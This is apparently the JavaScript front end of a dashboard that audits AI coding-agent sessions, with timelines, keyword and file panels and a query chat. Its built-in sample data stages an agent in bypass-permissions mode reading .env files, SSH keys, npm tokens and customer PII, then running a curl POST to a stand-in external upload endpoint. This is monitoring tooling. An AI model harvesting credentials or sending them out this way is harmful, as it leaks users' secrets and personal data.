/* =========================================================================
   clfx 대시보드 프론트 (표시 전용).
   - 엔진이 단일 진실원천: /api/events·/api/query 호출, JS로 분석 재구현 금지.
   - 서버 연결(LIVE) 시 집계 패널(히트맵·파일·키워드)은 엔진 /api/activity·/api/files·/api/keywords 사용(JS 재집계 금지·증거 분기 방지). 미연결 시 내장 샘플(MOCK)+UI 파생 fallback.
   - 시크릿(자격증명 패턴) 탐지 표시는 제거(회사별 기밀 판단 불가·오탐). 주체/권한(bypass)·키워드 중심.
   ========================================================================= */

/* ---------- 내장 샘플(서버 미연결 미리보기용) ---------- */
const MOCK = [
  {ts:"2026-06-11 01:00:03", actor:"user", action:"paste", target:"[붙여넣기 #1] .env 전문",
   preview:"STRIPE_SECRET_KEY=‹secret›\nAWS_ACCESS_KEY_ID=‹secret›\nDB_PASSWORD=‹secret›", tags:["secret"],
   kw:["AWS","Stripe","DB password"], source:{file:"paste-cache/de9c5c8c….txt",line:1}, session:"clfx-victim"},
  {ts:"2026-06-11 01:00:31", actor:"user", action:"prompt", target:"이 키들 정리해서 배포 스크립트 만들어줘",
   preview:"이 키들 정리해서 배포 스크립트 만들어줘", tags:[], kw:["배포"], source:{file:"projects/clfx-victim/sess.jsonl",line:14}, session:"clfx-victim"},
  {ts:"2026-06-11 01:01:12", actor:"agent", action:"read", target:"/home/u/clfx-victim/.env",
   preview:"AWS_SECRET_ACCESS_KEY=‹secret›\n…", tags:["secret","bypass-mode"], kw:["AWS",".env"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:21}, session:"clfx-victim"},
  {ts:"2026-06-11 01:01:18", actor:"agent", action:"read", target:"/home/u/clfx-victim/config.py",
   preview:"DB_PASSWORD = ‹secret›", tags:["secret","bypass-mode"], kw:["DB password","config"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:24}, session:"clfx-victim"},
  {ts:"2026-06-11 01:01:25", actor:"agent", action:"read", target:"/home/u/clfx-victim/keys/id_rsa",
   preview:"-----BEGIN OPENSSH PRIVATE KEY-----\n‹secret›", tags:["secret","bypass-mode"], kw:["SSH key","id_rsa"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:27}, session:"clfx-victim"},
  {ts:"2026-06-11 01:01:33", actor:"agent", action:"read", target:"/home/u/clfx-victim/.npmrc",
   preview:"//registry.npmjs.org/:_authToken=‹secret›", tags:["secret","bypass-mode"], kw:["npm token",".npmrc"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:30}, session:"clfx-victim"},
  {ts:"2026-06-11 01:02:02", actor:"agent", action:"bash", target:"curl -X POST https://api.ext.example/upload",
   preview:"외부 엔드포인트로 전송 시도(허용 API 경유)", tags:["bypass-mode"], kw:["외부전송","curl"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:34}, session:"clfx-victim"},
  {ts:"2026-06-11 01:02:40", actor:"agent", action:"response", target:"배포 스크립트 초안 작성 완료",
   preview:"키 4종을 포함한 deploy.sh 를 생성했습니다…", tags:[], kw:["배포"], source:{file:"projects/clfx-victim/sess.jsonl",line:38}, session:"clfx-victim"},
  {ts:"2026-06-12 09:14:07", actor:"user", action:"prompt", target:"어제 만든 배포 스크립트 다시 보여줘",
   preview:"어제 만든 배포 스크립트 다시 보여줘", tags:[], kw:["배포"], source:{file:"projects/clfx-victim/sess.jsonl",line:51}, session:"clfx-victim"},
  {ts:"2026-06-12 09:15:22", actor:"agent", action:"read", target:"/home/u/clfx-victim/app.py",
   preview:"import os\nDB = os.environ['DB_PASSWORD']", tags:["bypass-mode"], kw:["config","app.py"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:55}, session:"clfx-victim"},
  {ts:"2026-06-13 22:41:10", actor:"user", action:"paste", target:"[붙여넣기 #2] 고객 명단.csv",
   preview:"name,email,ssn\n홍길동,‹pii›,‹pii›", tags:["pii"], kw:["PII","고객명단"], source:{file:"paste-cache/a17f….txt",line:1}, session:"clfx-victim"},
  {ts:"2026-06-13 22:42:55", actor:"agent", action:"read", target:"/home/u/clfx-victim/customers.csv",
   preview:"홍길동,‹pii›,‹pii›\n…", tags:["pii","bypass-mode"], kw:["PII","고객명단"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:73}, session:"clfx-victim"},
  {ts:"2026-06-14 14:03:19", actor:"user", action:"prompt", target:"AWS 비용 줄이는 법 알려줘",
   preview:"AWS 비용 줄이는 법 알려줘", tags:[], kw:["AWS"], source:{file:"projects/clfx-victim/sess.jsonl",line:88}, session:"clfx-victim"},
  {ts:"2026-06-14 14:05:41", actor:"agent", action:"write", target:"/home/u/clfx-victim/deploy.sh",
   preview:"#!/bin/bash\nexport AWS_ACCESS_KEY_ID=‹secret›", tags:["secret"], kw:["AWS","배포"],
   source:{file:"projects/clfx-victim/sess.jsonl",line:92}, session:"clfx-victim"},
];

/* ---------- live state ---------- */
let EVENTS=[];   // 정규화된 표시 이벤트(서버 또는 MOCK)
let LIVE=false;  // 서버 연결 여부
// LIVE 시 엔진 집계 payload(JS 재집계 금지 — 그리기만). 각 null이면 해당 패널만 파생 fallback.
let SRV_ACTIVITY=null, SRV_FILES=null, SRV_KEYWORDS=null;

/* 키워드 파생(서버가 kw 미제공 시) — UI측 placeholder, /api/keywords 로 대체 예정 */
const KW_DICT=["AWS","Stripe","GitHub","OpenAI","npm","SSH","id_rsa",".env",".npmrc","config",
  "password","token","curl","deploy","배포","PII","email","고객","customers"];
function deriveKw(e){
  const out=[];
  if(["read","write","paste"].includes(e.action)&&e.target){
    const base=e.target.split(/[\/\\]/).pop().replace(/^\[|\]$/g,"").trim();
    if(base) out.push(base.length>22?base.slice(0,22):base);
  }
  const hay=((e.target||"")+" "+(e.preview||"")).toLowerCase();
  KW_DICT.forEach(k=>{if(hay.includes(k.toLowerCase()))out.push(k);});
  return [...new Set(out)].slice(0,4);
}
/* 엔진 event → 내부 표시형 정규화: source{file,line}→src 문자열, secret 태그 제거, kw 보강 */
function normalize(e){
  const src=e.source?`${e.source.file}:${e.source.line}`:(e.src||"");
  const o=Object.assign({},e,{src,tags:(e.tags||[]).filter(t=>t!=="secret")});
  if(!o.kw||!o.kw.length) o.kw=deriveKw(o);
  return o;
}

/* ---------- ts helpers (ISO 'T..Z' / 공백포맷 모두 대응) ---------- */
const WEEK=["일","월","화","수","목","금","토"];
function weekday(d){const D=new Date(d+"T00:00:00");return WEEK[D.getDay()];}
function dayOf(ts){return (ts||"").slice(0,10);}
function timeStr(ts){ts=ts||"";const t=ts.includes("T")?ts.split("T")[1]:ts.slice(11);return (t||"").replace("Z","").slice(0,8);}
function tsFull(ts){return (ts||"").replace("T"," ").replace("Z","");}

/* ---------- keyword agg ---------- */
const KWCOLORS=["#ef4444","#f59e0b","#38bdf8","#a855f7","#22c55e","#ec4899","#14b8a6","#eab308","#6366f1"];
function kwCounts(){const m={};EVENTS.forEach(e=>(e.kw||[]).forEach(k=>m[k]=(m[k]||0)+1));
  return Object.entries(m).sort((a,b)=>b[1]-a[1]).slice(0,9);}

/* ---------- state ---------- */
const $=s=>document.querySelector(s);
let SEL=null;
const active={user:true,agent:true,"bypass-mode":true};
const openDays={};
let srcActive=null;   // 활성 소스(origin) 집합. null/미설정이면 전체 통과.

/* ---------- source(origin) filter — 단일 PC의 WSL/Windows 출처 구분 ---------- */
const SRC_LABEL={wsl:"WSL",windows:"Windows",other:"기타"};
function originOf(e){const t=(e.tags||[]).find(x=>x.startsWith("origin:"));return t?t.slice(7):null;}
function originLabels(){return [...new Set(EVENTS.map(originOf).filter(Boolean))].sort();}
function inSrc(e){const o=originOf(e);if(o===null)return true;return !srcActive||srcActive.has(o);}  // origin 없는 이벤트(MOCK)는 항상 표시
function showTags(tags){return (tags||[]).filter(t=>!t.startsWith("origin:"));}  // origin: 태그는 배지서 숨김(필터·상세에만 사용)
function renderSrcFilters(){
  const labels=originLabels(),box=$("#srcfilters");
  if(labels.length<=1){box.innerHTML="";return;}   // 단일/무 origin → 토글 불필요
  box.innerHTML='<span style="font-size:11px;color:var(--faint);margin-right:4px;align-self:center">소스</span>'+
    labels.map(l=>`<span class="fchip src" data-src="${l}" aria-pressed="${srcActive.has(l)}">${SRC_LABEL[l]||l}</span>`).join("");
}

/* ---------- stats ---------- */
function renderStats(){
  const evs=EVENTS.filter(inSrc);   // 소스 토글 반영(EVENTS 기반 — 통계는 선택 소스 범위)
  $("#st-total").textContent=evs.length;
  $("#st-bypass").textContent=evs.filter(e=>e.tags.includes("bypass-mode")).length;
  $("#st-user").textContent=evs.filter(e=>e.actor==="user").length;
  $("#st-agent").textContent=evs.filter(e=>e.actor==="agent").length;
}

/* ---------- date helpers ---------- */
function ymd(d){return d.getFullYear()+"-"+String(d.getMonth()+1).padStart(2,"0")+"-"+String(d.getDate()).padStart(2,"0");}

/* ---------- calendar heatmap (GitHub식 · 달별 색 구분 — 대용량 대응) ---------- */
const MONTH_HUE=[210,255,290,330,8,40,75,150,180,200,300,235]; // 1~12월 고유 색상
function monthFill(m,lvl){const h=MONTH_HUE[(m-1)%12],L=[80,66,52,38][lvl-1];return `hsl(${h} 62% ${L}%)`;}
function monthTint(m){const h=MONTH_HUE[(m-1)%12];return `hsl(${h} 34% 94%)`;}
function renderHeatmap(){
  const cnt={};
  if(LIVE){    // LIVE 집계는 엔진만 — 실패 시 JS 재집계 금지(단일진실), 실패 표시 후 return
    if(!(SRV_ACTIVITY&&Array.isArray(SRV_ACTIVITY.rows))){
      $("#bars").innerHTML='<div class="empty">활동량 집계 불러오기 실패 (/api/activity)</div>';return;
    }
    SRV_ACTIVITY.rows.forEach(r=>{if(r.bucket!=="unknown")cnt[r.bucket]={u:r.user,a:r.agent};});
  }else{       // !LIVE(MOCK/offline) 전용 JS 파생
    EVENTS.forEach(e=>{const d=dayOf(e.ts);cnt[d]=cnt[d]||{u:0,a:0};cnt[d][e.actor==="user"?"u":"a"]++;});
  }
  const dates=Object.keys(cnt).sort();
  if(!dates.length){$("#bars").innerHTML='<div class="empty">데이터 없음</div>';return;}
  const maxD=new Date(dates[dates.length-1]+"T00:00:00");
  let start=new Date(maxD);start.setDate(start.getDate()-7*13);start.setDate(start.getDate()-start.getDay());
  let end=new Date(maxD);end.setDate(end.getDate()+(6-end.getDay()));
  const mx=Math.max(...Object.values(cnt).map(v=>v.u+v.a),1);
  const lvl=n=>!n?0:(n/mx>.75?4:n/mx>.5?3:n/mx>.25?2:1);
  const cells=[];const monthCols=[];const seenM=new Set();let col=0,lastM=-1;
  for(let d=new Date(start);d<=end;d.setDate(d.getDate()+1)){
    const iso=ymd(d),c=cnt[iso],n=c?c.u+c.a:0,m=d.getMonth()+1;
    if(d.getDay()===0){if(d.getMonth()!==lastM){monthCols.push({col,m});lastM=d.getMonth();}col++;}
    seenM.add(m);
    const cls=["hcell"];if(n)cls.push("has");
    const bg=n?monthFill(m,lvl(n)):monthTint(m);
    const title=c?`${iso} (${weekday(iso)}) · ${m}월  사용자 ${c.u} · 에이전트 ${c.a}`:`${iso}  활동 없음`;
    cells.push(`<div class="${cls.join(' ')}" data-d="${iso}" style="background:${bg}" title="${title}"></div>`);
  }
  const months=monthCols.map(({col,m})=>`<span style="flex:0 0 auto;margin-left:${col?7:0}px;color:hsl(${MONTH_HUE[(m-1)%12]} 50% 42%);font-weight:700">${m}월</span>`).join("");
  const mlegend=[...seenM].sort((a,b)=>a-b).map(m=>
    `<span class="mkey"><span class="msw" style="background:${monthFill(m,3)}"></span>${m}월</span>`).join("");
  $("#bars").innerHTML=`
    <div class="hmonths">${months}</div>
    <div class="heatgrid">${cells.join("")}</div>
    <div class="heatlegend">${mlegend} · 진할수록 활동 多</div>`;
}

/* ---------- 날짜 점프 (드롭다운 + 히트맵 공용) ---------- */
function jumpToDay(d){
  if(!d)return;
  openDays[d]=true;renderTimeline();
  const g=document.querySelector(`.daygrp[data-day="${d}"]`);
  if(g)g.scrollIntoView({behavior:"smooth",block:"start"});
  document.querySelectorAll(".hcell").forEach(c=>c.classList.toggle("on",c.dataset.d===d));
  const sel=$("#datejump");if(sel)sel.value=d;
}
function renderDateJump(){
  const cnt={};EVENTS.forEach(e=>{const d=dayOf(e.ts);cnt[d]=(cnt[d]||0)+1;});
  const dates=Object.keys(cnt).sort();
  $("#datejump").innerHTML=`<option value="">📅 날짜 이동…</option>`+
    dates.map(d=>`<option value="${d}">${d} (${weekday(d)}) · ${cnt[d]}건</option>`).join("");
}

/* ---------- donut ---------- */
function renderDonut(){
  // LIVE 집계는 엔진만 — 실패 시 JS 재집계 금지(단일진실). 미연결만 UI 파생 kwCounts().
  let data;
  if(LIVE){
    if(!(SRV_KEYWORDS&&Array.isArray(SRV_KEYWORDS.keywords))){
      $("#donut").innerHTML="";$("#legend").innerHTML='<div class="empty" style="padding:8px">키워드 집계 실패 (/api/keywords)</div>';return;
    }
    data=SRV_KEYWORDS.keywords.slice(0,9).map(k=>[k.term,k.count,k.by_actor||{}]);  // by_actor 보존(④)
  }else{ data=kwCounts(); }   // MOCK은 [term,count]만 — by_actor 없음(legend서 생략)
  const total=data.reduce((s,[,c])=>s+c,0);
  if(!total){$("#donut").innerHTML="";$("#legend").innerHTML='<div class="empty" style="padding:8px">키워드 없음</div>';return;}
  const cx=60,cy=60,r=44,sw=18,C=2*Math.PI*r;let off=0,segs="";
  data.forEach(([k,c],i)=>{const len=c/total*C,col=KWCOLORS[i%KWCOLORS.length];
    segs+=`<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="${col}" stroke-width="${sw}"
      stroke-dasharray="${len} ${C-len}" stroke-dashoffset="${-off}" transform="rotate(-90 ${cx} ${cy})"
      style="cursor:pointer" data-kw="${esc(k)}" data-col="${col}"><title>${k}: ${c} (클릭→시간분포)</title></circle>`;
    off+=len;});
  $("#donut").innerHTML=`<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="#eceff3" stroke-width="${sw}"/>${segs}
    <text x="60" y="56" text-anchor="middle" fill="#1b2433" font-size="20" font-weight="800" font-family="ui-monospace">${total}</text>
    <text x="60" y="72" text-anchor="middle" fill="#5c6675" font-size="9">키워드 언급</text>`;
  $("#legend").innerHTML=data.map(([k,c,ba],i)=>{
    const col=KWCOLORS[i%KWCOLORS.length];
    // actor 분리(④): by_actor 있으면 사용자/에이전트 둘 다. MOCK(ba undefined)이면 생략.
    const split=(ba&&(ba.user!=null||ba.agent!=null))
      ?`<span class="ksplit" style="color:var(--faint);font-size:10px;margin-left:6px">사용자 ${ba.user||0} · 에이전트 ${ba.agent||0}</span>`:"";
    return `<div class="li" data-kw="${esc(k)}" data-col="${col}">
     <span class="sw" style="background:${col}"></span>
     <span class="kw">${esc(k)}</span><span class="ct">${c}</span>${split}</div>`;
  }).join("");
}

/* ---------- file list ---------- */
function renderFiles(){
  // 행 형태 통일: [path,{u,a,tags[],idx}]. u/a=actor별 접근수(④ 분리 — 둘 다 표시, 단일화 금지).
  // tags는 표시단계서 secret/pii 제거(엔진 데이터는 유지). idx=상세 연결용 표시 이벤트 인덱스.
  const cleanTags=ts=>(ts||[]).filter(t=>t!=="secret"&&t!=="pii"&&!t.startsWith("origin:"));
  let rows;
  if(LIVE){    // LIVE 집계는 엔진만 — 실패 시 JS 재집계 금지(단일진실), 실패 표시 후 return
    if(!(SRV_FILES&&Array.isArray(SRV_FILES.files))){
      $("#fcount").textContent="0건";$("#files").innerHTML='<div class="empty">접근파일 집계 실패 (/api/files)</div>';return;
    }
    // 엔진 접근파일 집계(actor 분리·횟수·태그 서버값) 그대로 — JS 재집계 아님.
    rows=SRV_FILES.files.map(f=>{
      const ba=f.by_actor||{};
      const idx=EVENTS.findIndex(e=>e.target===f.target);   // 상세 패널 연결(표시 이벤트 매핑; 없으면 -1)
      return [f.target,{u:ba.user||0,a:ba.agent||0,tags:cleanTags(f.tags),idx}];
    });
  }else{       // !LIVE(MOCK/offline) 전용 JS 파생
    const m={};
    EVENTS.forEach((e,i)=>{
      if(!["read","write","paste"].includes(e.action))return;
      const f=m[e.target]=m[e.target]||{u:0,a:0,tags:[],idx:i};
      f[e.actor==="user"?"u":"a"]++;
      cleanTags(e.tags).forEach(t=>{if(!f.tags.includes(t))f.tags.push(t);});
    });
    rows=Object.entries(m);
  }
  $("#fcount").textContent=rows.length+"건";
  if(!rows.length){$("#files").innerHTML='<div class="empty">접근 파일 없음</div>';return;}
  $("#files").innerHTML=rows.map(([path,f])=>{
    const primaryU=f.u>=f.a,tg=f.tags[0];   // 아이콘은 다수 주체(장식). 카운트는 user/agent 둘 다 노출.
    const bcol=tg==="pii"?"var(--pii)":"var(--bypass)";
    const bg=tg?`<span class="fbadge" style="background:rgba(16,24,40,.04);color:${bcol};border:1px solid ${bcol}">${tg}</span>`:"";
    return `<div class="frow ${SEL===f.idx?'sel':''}" data-i="${f.idx}">
      <div class="fic ${primaryU?'u':'a'}">${primaryU?'👤':'🤖'}</div>
      <div class="fmeta"><div class="fpath">${esc(path)}</div>
        <div class="fsub">사용자 ${f.u} · 에이전트 ${f.a} · 총 ${f.u+f.a}회</div></div>${bg}</div>`;
  }).join("");
}

/* ---------- timeline grouped by date ---------- */
function badge(t){return `<span class="badge ${t}">${t}</span>`;}
function passFilter(e){
  if(!inSrc(e))return false;               // 소스(origin) 필터
  if(!active[e.actor])return false;
  if(!active["bypass-mode"]&&e.tags.includes("bypass-mode"))return false;
  return true;
}
function evCard(e,i){
  return `<div class="ev ${e.actor} ${SEL===i?'sel':''}" data-i="${i}">
    <div class="card">
      <div class="cmeta">
        <span class="ts">${timeStr(e.ts)}</span>
        <span class="who ${e.actor}">${e.actor==="user"?"A 사용자":"B 에이전트"}</span>
        <span class="act">/${e.action}</span>
        ${showTags(e.tags).map(badge).join("")}
      </div>
      <div class="ctarget">${esc(e.target)}</div>
      ${e.preview?`<div class="cprev">${esc(e.preview)}</div>`:""}
    </div></div>`;
}
function renderTimeline(){
  const groups={};
  EVENTS.forEach((e,i)=>{if(passFilter(e)){const d=dayOf(e.ts);(groups[d]=groups[d]||[]).push(i);}});
  const dates=Object.keys(groups).sort();
  if(!dates.length){$("#tlscroll").innerHTML=`<div class="empty">필터에 맞는 이벤트 없음</div>`;return;}
  $("#tlscroll").innerHTML=dates.map(d=>{
    const idxs=groups[d];
    const u=idxs.filter(i=>EVENTS[i].actor==="user").length;
    const a=idxs.length-u;
    const byp=idxs.filter(i=>EVENTS[i].tags.includes("bypass-mode")).length;
    const open=openDays[d]!==false;
    return `<div class="daygrp ${open?'open':''}" data-day="${d}">
      <div class="dayhdr">
        <span class="caret">▶</span>
        <span class="daydate">${d}</span><span class="dayweek">(${weekday(d)})</span>
        <span class="daymeta">
          ${byp?`<span class="pill s">bypass ${byp}</span>`:""}
          <span class="pill u">A ${u}</span><span class="pill a">B ${a}</span>
          <span class="pill">${idxs.length}건</span>
        </span>
      </div>
      <div class="daybody"><div class="timeline">${idxs.map(i=>evCard(EVENTS[i],i)).join("")}</div></div>
    </div>`;
  }).join("");
}

/* ---------- detail ---------- */
function renderDetail(i){
  SEL=i;const e=EVENTS[i];
  $("#detail").innerHTML=`
    <div class="row"><span class="k">시각</span><span class="v">${tsFull(e.ts)}</span></div>
    <div class="row"><span class="k">주체</span><span class="v"><span class="who ${e.actor}">${e.actor==="user"?"A 사용자(직접 입력)":"B 에이전트(자율)"}</span></span></div>
    <div class="row"><span class="k">동작</span><span class="v">${e.action}</span></div>
    <div class="row"><span class="k">대상</span><span class="v">${esc(e.target)}</span></div>
    <div class="row"><span class="k">태그</span><span class="v">${showTags(e.tags).length?showTags(e.tags).map(badge).join(" "):"-"}</span></div>
    <div class="row"><span class="k">소스</span><span class="v">${originOf(e)?(SRC_LABEL[originOf(e)]||originOf(e)):"-"}</span></div>
    <div class="row"><span class="k">세션</span><span class="v">${esc(e.session||"")}</span></div>
    <div class="row"><span class="k">출처</span><span class="v"><span class="src">${esc(e.src)}</span></span></div>
    <pre>${esc(e.preview||"(preview 없음)")}</pre>`;
  renderTimeline();renderFiles();
}

/* ---------- events ---------- */
$("#filters").addEventListener("click",ev=>{
  const c=ev.target.closest(".fchip");if(!c)return;
  const f=c.dataset.f;active[f]=!active[f];c.setAttribute("aria-pressed",active[f]);renderTimeline();
});
$("#srcfilters").addEventListener("click",ev=>{
  const c=ev.target.closest(".fchip.src");if(!c||!srcActive)return;
  const l=c.dataset.src;
  if(srcActive.has(l))srcActive.delete(l);else srcActive.add(l);
  c.setAttribute("aria-pressed",srcActive.has(l));
  renderAll();   // 소스 토글 → 타임라인·통계 갱신(EVENTS 기반). 서버집계(히트맵/도넛/파일)는 전체 범위 유지.
});
$("#tlscroll").addEventListener("click",ev=>{
  const hdr=ev.target.closest(".dayhdr");
  if(hdr){const g=hdr.parentElement,d=g.dataset.day;openDays[d]=!g.classList.contains("open");renderTimeline();return;}
  const c=ev.target.closest(".ev");if(c)renderDetail(+c.dataset.i);
});
$("#files").addEventListener("click",ev=>{const c=ev.target.closest(".frow");if(c)renderDetail(+c.dataset.i);});
$("#bars").addEventListener("click",ev=>{const c=ev.target.closest(".hcell.has");if(c)jumpToDay(c.dataset.d);});
$("#datejump").addEventListener("change",e=>jumpToDay(e.target.value));

/* ---------- keyword distribution popup ---------- */
function placePop(pop,x,y){
  pop.classList.add("open");
  const w=268,h=pop.offsetHeight||180;
  pop.style.left=Math.max(8,Math.min(x,window.innerWidth-w-8))+"px";
  pop.style.top=Math.max(8,Math.min(y,window.innerHeight-h-8))+"px";
}
function showKwPop(kw,col,x,y){
  // 분포·판정은 엔진 단일진실. LIVE → SRV_KEYWORDS의 by_day/pattern 그대로(JS 재매칭 금지).
  // 미연결(offline) → UI 파생(e.kw 매칭) fallback.
  const srvK=(LIVE&&SRV_KEYWORDS)?(SRV_KEYWORDS.keywords||[]).find(k=>k.term===kw):null;
  let perday,total,days,evs=null;
  if(srvK){
    perday=srvK.by_day||{};total=srvK.count;days=srvK.days;
  }else{
    evs=EVENTS.filter(e=>(e.kw||[]).includes(kw)).sort((a,b)=>a.ts<b.ts?-1:1);
    if(!evs.length)return;
    perday={};evs.forEach(e=>{const d=dayOf(e.ts)||"unknown";perday[d]=(perday[d]||0)+1;});  // 빈날짜 → unknown
    total=evs.length;days=Object.keys(perday).length;
  }
  if(!Object.keys(perday).length)return;
  // 날짜연산은 YYYY-MM-DD 키만 — unknown/빈날짜는 new Date Invalid → NaN 위치. 누락은 "날짜미상 N회" 정직 표기.
  const DOK=d=>/^\d{4}-\d{2}-\d{2}$/.test(d);
  const unknownN=perday["unknown"]||0;
  const uknote=unknownN>0?` · 날짜미상 ${unknownN}회`:"";
  const validEntries=Object.entries(perday).filter(([d])=>DOK(d));
  const all=EVENTS.map(e=>dayOf(e.ts)).filter(DOK).sort();
  const pop=$("#kwpop");
  let verdict;
  if(srvK){    // 엔진 판정 pattern 그대로(JS 재판정 안 함)
    verdict=srvK.pattern==="집중형"
      ?`<span class="verdict focus">⚡ 집중형 — ${days}일에 ${total}회 (엔진 판정)</span>`
      :`<span class="verdict sustain">↔ 지속형 — ${days}일에 걸쳐 ${total}회 (엔진 판정)</span>`;
  }else{
    const vd=validEntries.map(([d])=>d).sort();
    const winDays=vd.length?Math.round((new Date(vd[vd.length-1]+"T00:00:00")-new Date(vd[0]+"T00:00:00"))/86400000)+1:0;
    const focus=days<=2||winDays<=3;
    verdict=focus
      ?`<span class="verdict focus">⚡ 집중형 — ${winDays}일 내 ${total}회 몰림</span>`
      :`<span class="verdict sustain">↔ 지속형 — ${winDays}일에 걸쳐 ${total}회 반복</span>`;
  }
  const ba=srvK?srvK.by_actor:null;   // 키워드 actor 분리(④) — LIVE만(MOCK은 생략)
  const actorLine=(ba&&(ba.user!=null||ba.agent!=null))
    ?`<div class="ksub">주체 — 사용자 ${ba.user||0} · 에이전트 ${ba.agent||0}</div>`:"";
  if(!validEntries.length){    // 전부 날짜미상 → 스파크 없이 라벨만(NaN 위치 회피)
    pop.innerHTML=`<div class="kt"><span class="sw" style="background:${col}"></span>${esc(kw)}</div>
      <div class="ksub">총 ${total}회${uknote}</div>
      ${actorLine}
      ${verdict}`;
    placePop(pop,x,y);return;
  }
  const vd=validEntries.map(([d])=>d).sort();
  const axis=all.length?all:vd;          // 전체 타임라인 축 의도 보존; EVENTS 유효일 없으면 키워드 범위로 폴백(undefined 차단)
  const t0=new Date(axis[0]+"T00:00:00"),t1=new Date(axis[axis.length-1]+"T00:00:00");
  const span=Math.max(t1-t0,86400000);
  const mxc=Math.max(...validEntries.map(([,c])=>c),1);
  const ticks=validEntries.map(([d,c])=>{
    const left=((new Date(d+"T00:00:00")-t0)/span)*100;
    return `<div class="kwtick" style="left:calc(${left}% - 2px);height:${10+c/mxc*32}px" title="${d}: ${c}회"></div>`;
  }).join("");
  pop.innerHTML=`<div class="kt"><span class="sw" style="background:${col}"></span>${esc(kw)}</div>
    <div class="ksub">총 ${total}회 언급 · ${days}일${uknote} · ${axis[0]}~${axis[axis.length-1]}</div>
    ${actorLine}
    ${verdict}
    <div class="kwspark">${ticks}</div>
    <div class="kwaxis"><span>${axis[0]}</span><span>${axis[axis.length-1]}</span></div>`;
  placePop(pop,x,y);
}
function kwClick(ev){
  const t=ev.target.closest("[data-kw]");if(!t)return;
  ev.stopPropagation();
  showKwPop(t.dataset.kw,t.dataset.col||"#38bdf8",ev.clientX+12,ev.clientY+8);
}
$("#legend").addEventListener("click",kwClick);
$("#donut").addEventListener("click",kwClick);
document.addEventListener("click",ev=>{
  if(!ev.target.closest("#kwpop")&&!ev.target.closest("[data-kw]")) $("#kwpop").classList.remove("open");
});

/* ---------- AI copilot ---------- */
const SUGGEST=["누가 id_rsa 읽었어?","bypass 모드로 읽은 파일?","타임라인 요약해줘","PII 노출 있었어?"];
function renderSuggest(){$("#suggest").innerHTML=SUGGEST.map(s=>`<span class="sg">${s}</span>`).join("");}
function addMsg(role,html){const d=document.createElement("div");d.className="msg "+role;d.innerHTML=html;
  $("#chatlog").appendChild(d);$("#chatlog").scrollTop=1e9;}

/* 서버 /api/query 결과 → 채팅 메시지 포맷 */
function formatQueryResult(d){
  const evs=(d.events||[]).map(normalize);
  const n=d.count!=null?d.count:evs.length;
  const head=(d.summary&&d.summary.text)?esc(d.summary.text):`결과 <b>${n}</b>건 <span style="color:var(--faint)">(op: ${esc(d.op||"search")})</span>`;
  const top=evs.slice(0,3).map(e=>{
    const who=e.actor==="agent"?"B 에이전트":"A 사용자";
    return `· <b>${who}</b> /${esc(e.action)} ${esc((e.target||"").split(/[\/\\]/).pop())}`;
  }).join("<br>");
  const cite=evs[0]?`<span class="cite">↳ ${esc(evs[0].src)}${n>1?` 외 ${n-1}건`:""}</span>`:"";
  // 로컬 LLM(gemma4) 미연결 시 digest 폴백 — 결정적 요약임을 작게 안내(llm 모드면 안 붙임).
  const hint=(d.summary&&d.summary.mode==="digest")?`<span class="cite">(로컬 LLM 미연결 — 결정적 요약)</span>`:"";
  return head+(top?`<br>${top}`:"")+cite+hint;
}
/* 샘플(서버 미연결) 모드 로컬 응답 — 데모/미리보기용 */
function mockAnswer(q){
  const lo=q.toLowerCase();
  if(/누가|who/.test(q)){
    const m=EVENTS.filter(e=>e.action==="read"&&q.replace(/[?？]/g,"").split(/\s+/).some(w=>w.length>2&&e.target.includes(w)));
    if(m.length){const e=m[0];
      return `<b>${e.actor==="agent"?"B 에이전트":"A 사용자"}</b>가 <b>${esc(e.target.split('/').pop())}</b>를 읽었습니다 (${e.tags.includes("bypass-mode")?"bypassPermissions 모드":"일반"}). <b>에이전트 자율 행위</b>.<span class="cite">↳ ${esc(e.src)} · ${tsFull(e.ts)}</span>`;}
  }
  if(/bypass|권한|자율|위험/.test(lo)){
    const b=EVENTS.filter(e=>e.tags.includes("bypass-mode"));
    return `bypassPermissions 모드 자율 행위 <b>${b.length}건</b>: ${[...new Set(b.map(e=>e.target.split('/').pop()))].slice(0,5).join(", ")}. 사용자 승인 없이 <b>에이전트가 자율 실행</b>.<span class="cite">↳ ${b.length}개 이벤트</span>`;
  }
  if(/pii|개인정보|명단/.test(lo)){
    const p=EVENTS.filter(e=>e.tags.includes("pii"));
    return p.length?`PII 태그 <b>${p.length}건</b>: ${[...new Set(p.map(e=>e.target.split('/').pop()))].join(", ")}.<span class="cite">↳ ${p.map(e=>e.src).slice(0,2).join(" / ")}</span>`:"PII 태그 이벤트 없음.";
  }
  if(/요약|정리|타임라인/.test(q)){
    const u=EVENTS.filter(e=>e.actor==="user").length,a=EVENTS.filter(e=>e.actor==="agent").length;
    return `요약 — 총 ${EVENTS.length}건(사용자 ${u} · 에이전트 ${a}). 흐름: 사용자가 파일/키 붙여넣기 → 에이전트가 관련 파일 자율 열람 → 외부 전송 시도.<span class="cite">↳ 요약은 LLM 어댑터, 증거는 결정적 엔진</span>`;
  }
  const m=EVENTS.filter(e=>(e.target+e.preview).toLowerCase().includes(lo));
  return m.length?`검색 결과 <b>${m.length}건</b>: ${m.slice(0,3).map(e=>esc(e.target.split('/').pop())).join(", ")}…`
    :`관련 이벤트를 찾지 못했습니다. 예) "누가 .env 읽었어?", "타임라인 요약"`;
}
async function ask(q){
  if(!q.trim())return;
  addMsg("user",esc(q));$("#ask").value="";
  if(LIVE){
    // gemma4 대화형 답은 수초 걸림 → 대기 메시지 표시 후 결과로 교체.
    const wait=document.createElement("div"); wait.className="msg ai"; wait.textContent="🤔 분석 중…";
    $("#chatlog").appendChild(wait); $("#chatlog").scrollTop=1e9;
    try{
      const r=await fetch("/api/query?q="+encodeURIComponent(q));
      const d=await r.json();
      if(d.error)throw new Error(d.error);
      wait.remove();
      addMsg("ai",formatQueryResult(d));
    }catch(err){wait.remove(); addMsg("ai",`질의 실패: ${esc(err.message)}`);}
    return;
  }
  setTimeout(()=>addMsg("ai",mockAnswer(q)),160);
}
